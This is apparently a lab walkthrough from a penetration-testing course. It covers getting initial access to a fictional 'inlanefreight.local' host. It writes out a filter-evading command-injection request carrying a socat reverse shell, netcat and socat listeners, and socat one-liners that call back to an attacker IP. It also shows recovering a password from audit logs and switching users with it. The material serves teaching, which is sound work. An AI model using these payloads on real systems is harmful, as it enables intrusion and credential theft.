# Initial Access

---

Now that we've thoroughly enumerated and attacked the external perimeter and uncovered a wealth of findings, we're ready to shift gears and focus on obtaining stable internal network access. Per the SoW document, if we can achieve an internal foothold, the client would like us to see how far we can go up to and including gaining `Domain Admin level access`. In the last section, we worked hard on peeling apart the layers and finding web apps that led to early file read or remote code execution but didn't get us into the internal network. We left off with obtaining RCE on the `monitoring.inlanefreight.local` application after a hard-fought battle against filters and blacklists set in place to try to prevent `Command Injection` attacks.

---

## Getting a Reverse Shell

As mentioned in the previous section, we can use [Socat](https://linux.die.net/man/1/socat) to establish a reverse shell connection. Our base command will be as follows, but we'll need to tweak it some to get past the filtering:

Initial Access

```shell-session
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

We can modify this command to give us a payload to catch a reverse shell.

Initial Access

```shell-session
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Start a `Netcat` listener on the port used in the Socat command (8443 here) and execute the above request in Burp Repeater. If all goes as intended, we will have a reverse shell as the `webdev` user.

Initial Access

```shell-session
swmpdnky@htb[/htb]$ nc -nvlp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm) 
```

Next, we'll need to upgrade to an `interactive TTY`. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) describes a few methods. We could use a method that was also covered in the [Types of Shells](https://academy.hackthebox.com/module/77/section/725) section of the `Getting Started` module, executing the well-known Python one-liner (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) to spawn a psuedo-terminal. But we're going to try something a bit different using `Socat`. The reason for doing this is to get a proper terminal so we can run commands like `su`, `sudo`, `ssh`, `use command completion`, and `open a text editor if needed`.

We'll start a Socat listener on our attack host.

Initial Access

```shell-session
swmpdnky@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```

Next, we'll execute a Socat one-liner on the target host.

Initial Access

```shell-session
swmpdnky@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

If all goes as planned, we'll have a stable reverse shell connection on our Socat listener.

Initial Access

```shell-session
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

Now that we've got a stable reverse shell, we can start digging around the file system. The results of the `id` command are immediately interesting. The [Privileged Groups](https://academy.hackthebox.com/module/51/section/477) section of the `Linux Privilege Escalation` module shows an example of users in the `adm` group having rights to read ALL logs stored in `/var/log`. Perhaps we can find something interesting there. We can use [aureport](https://linux.die.net/man/8/aureport) to read audit logs on Linux systems, with the man page describing it as "aureport is a tool that produces summary reports of the audit system logs."

Initial Access

```shell-session
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

After running the command, type `q` to return to our shell. From the above output, it looks like a user was trying to authenticate as the `srvadm` user, and we have a potential credential pair `srvadm:ILFreightnixadm!`. Using the `su` command, we can authenticate as the `srvadm` user.

Initial Access

```shell-session
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```

Now that we've bypassed heavy filtering to achieve command injection, turned that code execution into a reverse shell, and escalated our privileges to another user, we don't want to lose access to this host. In the next section, we'll work towards achieving persistence, ideally after escalating privileges to `root`.